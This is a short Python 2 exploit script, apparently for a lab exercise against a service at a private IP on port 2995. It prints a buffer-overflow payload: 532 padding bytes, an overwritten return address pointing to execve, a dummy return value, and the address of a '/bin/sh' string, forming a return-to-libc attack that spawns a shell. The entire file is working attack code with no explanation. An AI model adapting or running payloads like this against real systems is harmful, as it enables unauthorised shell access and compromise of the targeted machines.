import struct
import socket


HOST = "192.168.206.132"
PORT = 2995


def main():
    padding = "A"*532
    execve = struct.pack("<I", 0x08048c0c)
    binsh = struct.pack("<I", 0xb7fb63bf)  # /bin/sh offset=1176340

    print padding + execve + "DDDD" + binsh + "\x00"*8


if __name__ == "__main__":
    main()

